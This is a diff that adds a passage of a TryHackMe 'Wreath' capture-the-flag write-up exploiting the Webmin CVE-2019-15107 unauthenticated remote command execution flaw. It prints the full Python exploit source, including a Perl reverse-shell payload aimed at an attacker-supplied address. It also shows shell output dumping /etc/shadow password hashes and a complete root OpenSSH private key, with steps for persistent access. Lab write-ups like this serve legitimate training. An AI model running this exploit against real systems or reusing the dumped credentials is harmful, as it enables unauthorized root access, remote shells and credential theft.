@@ -301,3 +301,458 @@ In real life we would perform a "footprinting" phase of the engagement at this p
 8. **We have everything we need to break into this machine, so let's get going!**
 
 - **_No Answer Needed_**
+
+### Task 6
+
+In the previous task we found a vulnerable service[1][2] running on the target which will give us the ability to execute commands on the target.
+
+The next step would usually be to find an exploit for this vulnerability. There are often exploits available online for known vulnerabilities (and we will cover searching for these in an upcoming task!), however, in this instance, an exploit is provided here.
+
+Start by cloning the repository. This can be done with the following command:
+
+`git clone https://github.com/MuirlandOracle/CVE-2019-15107`
+
+This creates a local copy of the exploit on our attacking machine. Navigate into the folder then install the required Python libraries:
+
+`cd CVE-2019-15107 && pip3 install -r requirements.txt`
+
+If this doesn't work, you may need to install pip before downloading the libraries. This can be done with:
+`sudo apt install python3-pip`
+
+The script should already be executable, but if not, add the executable bit (`chmod +x ./CVE-2019-15107.py`).
+
+Never run an unknown script from the internet! Read through the code and see if you can get an idea of what it's doing. (Don't worry if you aren't familiar with Python -- in this case the exploit was coded by the author of this content and is being run in a lab environment, so you can infer that it isn't malicious. It is, however, good practice to read through scripts before running them).
+
+Once you're satisfied that the script will do what it says it will, run the exploit against the target!
+
+`./CVE-2019-15107.py TARGET_IP`
+
+![RCE Exploit](https://github.com/vrbait1107/CTF_WRITEUPS/blob/main/TryHackMe/images/Wreath/wreath-8.png)
+
+https://sensorstechforum.com/cve-2019-15107-webmin/
+https://www.webmin.com/exploit.html
+
+**_Answer The Following_**
+
+1. **Run the exploit and obtain a pseudoshell on the target!**
+
+- **_No Answer Needed._**
+
+**EXPLOIT**
+
+```python
+
+#!/usr/bin/python3
+#Webmin 1.890-1.920 RCE
+#CVE-2019-15107
+#Based on Metasploit Module (EDB ID: 47230)
+#AG | MuirlandOracle
+#11/20
+
+#### Imports ####
+import argparse, requests, sys, signal, ssl, random, string, os, socket
+from prompt_toolkit import prompt
+from prompt_toolkit.history import FileHistory
+from urllib3.exceptions import InsecureRequestWarning
+
+
+#### Globals ####
+class colours():
+	red = "\033[91m"
+	green = "\033[92m"
+	blue = "\033[34m"
+	orange = "\033[33m"
+	purple = "\033[35m"
+	end = "\033[0m"
+
+
+banner = (f"""{colours.orange}
+	__        __   _               _         ____   ____ _____
+	\ \      / /__| |__  _ __ ___ (_)_ __   |  _ \ / ___| ____|
+	 \ \ /\ / / _ \ '_ \| '_ ` _ \| | '_ \  | |_) | |   |  _|
+	  \ V  V /  __/ |_) | | | | | | | | | | |  _ <| |___| |___
+	   \_/\_/ \___|_.__/|_| |_| |_|_|_| |_| |_| \_\\____|_____|
+
+						{colours.purple}@MuirlandOracle
+
+		{colours.end}""")
+
+#### Ignore Unverified SSL certs ####
+requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)
+
+#### Handle Signals ####
+def sigHandler(sig, frame):
+	print(f"{colours.blue}\n[*] Exiting....{colours.end}\n")
+	sys.exit(0);
+
+#### Exploit Class ####
+class Exploit():
+	def __init__(self):
+		self.endpoint = "password_change.cgi"
+		self.versions = ["1.890", "1.900", "1.910", "1.920"]
+		#Start a session
+		self.session = requests.Session()
+		self.session.verify = False
+
+	#### Colour Helpers ####
+	def fail(self, reason, die=True):
+		if not self.args.accessible:
+			print(f"{colours.red}[-] {reason}{colours.end}")
+		else:
+			print(f"Failure: {reason}")
+		if die:
+			sys.exit(0)
+
+	def success(self, text):
+		if not self.args.accessible:
+			print(f"{colours.green}[+] {text}{colours.end}")
+		else:
+			print(f"Success: {text}")
+
+	def warn(self, text):
+		if not self.args.accessible:
+			print(f"{colours.orange}[*] {text}{colours.end}")
+		else:
+			print(f"Warning: {text}")
+
+	def info(self, text):
+		if not self.args.accessible:
+			print(f"{colours.blue}[*] {text}{colours.end}")
+		else:
+			print(f"Info: {text}")
+
+
+
+	#### Argument Parsing ####
+	def parseArgs(self):
+		parser = argparse.ArgumentParser(description="CVE-2019-15107 Webmin Unauthenticated RCE (1.890-1.920) Framework")
+		parser.add_argument("target", help="The target IP or domain")
+		parser.add_argument("-b", "--basedir", help="The base directory of webmin (default: /)", default="/")
+		parser.add_argument("-s", "--ssl", help="Specify to use SSL", default="http://",  const="https://", action="store_const")
+		parser.add_argument("-p", "--port", type=int, default=10000, help="The target port (default: 10000)")
+		parser.add_argument("--accessible", default=False, action="store_true", help="Remove ascii art")
+		parser.add_argument("--force", default=False, action="store_true", help="Force exploitation with no checks")
+		args = parser.parse_args()
+
+		#Validation
+		args.basedir = f"/{args.basedir}" if (args.basedir[0] != "/") else f"{args.basedir}"
+		if args.port not in range(1,65535):
+			self.fail(f"Invalid Port: {args.port}")
+		self.args = args
+
+
+	#### Checks ####
+	def checkConnect(self):
+		target = f"{self.args.ssl}{self.args.target}:{self.args.port}{self.args.basedir}"
+		try:
+			r = self.session.get(target, timeout=5)
+		except requests.exceptions.SSLError:
+			self.info("Server is running without SSL. Switching to HTTP")
+			self.args.ssl = "http://"
+			self.checkConnect()
+			return
+		except:
+			self.fail(f"Failed to connect to {target}")
+		if " SSL " in r.content.decode().upper():
+			self.info("Server is running in SSL mode. Switching to HTTPS")
+			self.args.ssl = "https://"
+			self.checkConnect()
+			return
+		self.success(f"Connected to {target} successfully.")
+
+
+	def checkVersion(self):
+		target = f"{self.args.ssl}{self.args.target}:{self.args.port}{self.args.basedir}"
+		r = self.session.get(target)
+		try:
+			version = r.headers["Server"].split("/")[1]
+		except:
+			self.fail("Couldn't find server version")
+		if version not in self.versions:
+			self.fail(f"Server version ({version}) not vulnerable.")
+		else:
+			self.success(f"Server version ({version}) should be vulnerable!")
+			if version != self.versions[0]:
+				self.warn("Server version relies on expired password changing feature being enabled")
+
+
+	def checkVulnerable(self):
+		target = f"{self.args.ssl}{self.args.target}:{self.args.port}{self.args.basedir}"
+		testString = "".join(random.choices(string.ascii_letters + string.digits, k=8))
+		check = self.exploitVuln(f"echo {testString}")
+		if testString in check:
+			self.success("Benign Payload executed!")
+		elif "Password changing is not enabled" in check:
+			self.fail("Password changing is disabled for this server")
+		else:
+			self.fail("Benign Payload failed to execute")
+
+	def runChecks(self):
+		self.checkConnect()
+		self.checkVersion()
+		self.checkVulnerable()
+
+	#### Exploit ####
+	def exploitVuln(self, command):
+		slash = lambda: "/" if (self.args.basedir[-1] != "/") else ""
+		target = f"{self.args.ssl}{self.args.target}:{self.args.port}{self.args.basedir}{slash()}{self.endpoint}"
+		token = "".join(random.choices(string.ascii_letters + string.digits, k=8))
+		headers = {
+			"Referer":f"{self.args.ssl}{self.args.target}:{self.args.port}{self.args.basedir}"
+		}
+		params = {
+			#Param for 1.890
+			"expired":command,
+			#Params for 1.900-1.920
+			"new1":token,
+			"new2":token,
+			"old":command
+		}
+		try:
+			r = self.session.post(target, data=params, headers=headers, timeout=5)
+		except:
+			return "Error"
+		return(r.content.decode())
+
+
+	def pseudoShell(self):
+		print()
+		if not self.args.force:
+			self.success("The target is vulnerable and a pseudoshell has been obtained.\n"
+						"Type commands to have them executed on the target.")
+			self.info("Type 'exit' to exit.")
+			self.info("Type 'shell' to obtain a full reverse shell (UNIX only).")
+		else:
+			self.warn("Warning: No checks have been carried out -- proceed with caution!")
+		print()
+		while True:
+			try:
+				command = prompt("# ", history=FileHistory("commands.txt"))
+			except KeyboardInterrupt:
+				self.info("Exiting...\n")
+				sys.exit(0)
+			if command.lower() == "quit" or command.lower() == "exit":
+				self.info("Exiting...\n")
+				sys.exit(0)
+			elif command.lower() == "shell":
+				self.shell()
+				continue
+			elif len(command) == 0:
+				continue
+			results = self.exploitVuln(f"echo SPLIT; {command} 2>&1; echo SPLIT")
+			if "SPLIT" in results:
+				print(results.split("SPLIT")[1].strip())
+			else:
+				self.fail("Failed to execute command", False)
+				if self.args.force:
+					print("(This is why checks exist)")
+
+	def shell(self):
+		print()
+		self.info("Starting the reverse shell process")
+		self.warn("For UNIX targets only!")
+		self.warn("Use 'exit' to return to the pseudoshell at any time")
+		#Get IP
+		while True:
+			ip = input("Please enter the IP address for the shell: ")
+			if ip.lower() == "exit":
+				return
+			try:
+				socket.inet_aton(ip)
+			except socket.error:
+				self.fail("Invalid IP address\n", False)
+				continue
+			break
+
+		#Get port
+		while True:
+			port = input("Please enter the port number for the shell: ")
+			if port.lower() == "exit":
+				return
+			try:
+				port = int(port)
+				assert(port < 65535 and port >= 1)
+			except:
+				self.fail("Invalid port number\n", False)
+				continue
+			break
+
+		#It's webmin, so perl must be installed
+		shellcode = "perl -e 'use Socket;$i=\"" + ip + "\";$p=" + str(port) + ";socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'"
+
+		print()
+		sudoCheck = lambda: "sudo " if (port < 1024) else ""
+		self.warn(f"Start a netcat listener in a new window ({sudoCheck()}nc -lvnp {port}) then press enter.")
+		input()
+		self.exploitVuln(shellcode)
+		self.success("You should now have a reverse shell on the target")
+		self.warn("If this is not the case, please check your IP and chosen port\nIf these are correct then there is likely a firewall preventing the reverse connection. Try choosing a well-known port such as 443 or 53")
+
+
+#### Run ####
+if __name__ == "__main__":
+	signal.signal(signal.SIGINT, sigHandler)
+	exploit = Exploit()
+	exploit.parseArgs()
+	if not exploit.args.accessible:
+		print(banner)
+	else:
+		print("Webmin RCE Exploit, code written by @MuirlandOracle")
+	if not exploit.args.force:
+		exploit.runChecks()
+	exploit.pseudoShell()
+
+```
+
+2. **Which user was the server running as?**
+
+- **_root_**
+
+```
+
+PS C:\Users\something\Desktop\CVE-2019-15107> python .\CVE-2019-15107.py 10.200.193.200
+←[33m
+        __        __   _               _         ____   ____ _____
+        \ \      / /__| |__  _ __ ___ (_)_ __   |  _ \ / ___| ____|
+         \ \ /\ / / _ \ '_ \| '_ ` _ \| | '_ \  | |_) | |   |  _|
+          \ V  V /  __/ |_) | | | | | | | | | | |  _ <| |___| |___
+           \_/\_/ \___|_.__/|_| |_| |_|_|_| |_| |_| \_\____|_____|
+
+                                                ←[35m@MuirlandOracle
+
+                ←[0m
+←[34m[*] Server is running in SSL mode. Switching to HTTPS←[0m
+←[92m[+] Connected to https://10.200.193.200:10000/ successfully.←[0m
+←[92m[+] Server version (1.890) should be vulnerable!←[0m
+←[92m[+] Benign Payload executed!←[0m
+
+←[92m[+] The target is vulnerable and a pseudoshell has been obtained.
+Type commands to have them executed on the target.←[0m
+←[34m[*] Type 'exit' to exit.←[0m
+←[34m[*] Type 'shell' to obtain a full reverse shell (UNIX only).←[0m
+
+# root
+sh: root: command not found
+# whoami
+root
+# cat /etc/shadow
+root:$6$i9vT8tk3SoXXxK2P$HDIAwho9FOdd4QCecIJKwAwwh8Hwl.BdsbMOUAd3X/chSCvrmpfy.5lrLgnRVNq6/6g0PxK9VqSdy47/qKXad1::0:99999:7:::
+bin:*:18358:0:99999:7:::
+daemon:*:18358:0:99999:7:::
+adm:*:18358:0:99999:7:::
+lp:*:18358:0:99999:7:::
+sync:*:18358:0:99999:7:::
+shutdown:*:18358:0:99999:7:::
+halt:*:18358:0:99999:7:::
+mail:*:18358:0:99999:7:::
+operator:*:18358:0:99999:7:::
+games:*:18358:0:99999:7:::
+ftp:*:18358:0:99999:7:::
+nobody:*:18358:0:99999:7:::
+dbus:!!:18573::::::
+systemd-coredump:!!:18573::::::
+systemd-resolve:!!:18573::::::
+tss:!!:18573::::::
+polkitd:!!:18573::::::
+libstoragemgmt:!!:18573::::::
+cockpit-ws:!!:18573::::::
+cockpit-wsinstance:!!:18573::::::
+sssd:!!:18573::::::
+sshd:!!:18573::::::
+chrony:!!:18573::::::
+rngd:!!:18573::::::
+twreath:$6$0my5n311RD7EiK3J$zVFV3WAPCm/dBxzz0a7uDwbQenLohKiunjlDonkqx1huhjmFYZe0RmCPsHmW3OnWYwf8RWPdXAdbtYpkJCReg.::0:99999:7:::
+unbound:!!:18573::::::
+apache:!!:18573::::::
+nginx:!!:18573::::::
+mysql:!!:18573::::::
+#
+
+```
+
+3. **Success! We won't need to escalate privileges here, so we can move on to the next step in the exploitation process.**
+
+**Before we do though: nice though this pseudoshell is, it's not a full reverse shell.**
+
+**Get a reverse shell from the target. You can either do this manually, or by typing shell into the pseudoshell and following the instructions given.**
+
+- **_No Answer Needed._**
+
+4. **Optional: Stabilise the reverse shell. There are several techniques for doing this detailed [here](https://tryhackme.com/room/introtoshells).**
+
+- **_No Answer Needed._**
+
+5. **Now for a little post-exploitation!**
+
+**What is the root user's password hash?**
+
+- **_$6$i9vT8tk3SoXXxK2P$HDIAwho9FOdd4QCecIJKwAwwh8Hwl.BdsbMOUAd3X/chSCvrmpfy.5lrLgnRVNq6/6g0PxK9VqSdy47/qKXad1_**
+
+6. **You won't be able to crack the root password hash, but you might be able to find a certain file that will give you consistent access to the root user account through one of the other services on the box.**
+
+**What is the full path to this file?**
+
+- **_Ans: /root/.ssh/id_rsa_**
+
+```
+$
+[root@prod-serv ]# cd ~
+[root@prod-serv ~]# cd .ssh
+[root@prod-serv .ssh]# ls -la
+total 16
+drwx------. 2 root root   80 Jan  6  2021 .
+dr-xr-x---. 3 root root  202 Sep 21 13:54 ..
+-rw-r--r--. 1 root root  571 Nov  7  2020 authorized_keys
+-rw-------. 1 root root 2602 Nov  7  2020 id_rsa
+-rw-r--r--. 1 root root  571 Nov  7  2020 id_rsa.pub
+-rw-r--r--. 1 root root  347 Sep 21 14:41 known_hosts
+[root@prod-serv .ssh]# cat id_rsa
+bash: catid_rsa: command not found
+[root@prod-serv .ssh]# cat id_rsa
+-----BEGIN OPENSSH PRIVATE KEY-----
+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
+-----END OPENSSH PRIVATE KEY-----
+[root@prod-serv .ssh]#
+
+```
+
+7. **Download the key (copying and pasting it to a file on your own Attacking Machine works), then use the command chmod 600 KEY_NAME (substituting in the name of the key) to obtain persistent access to the box.**
+
+**We have everything we need for now. Let's move on to the next section: Pivoting!**
+
+- **_Ans: No Answer Needed._**
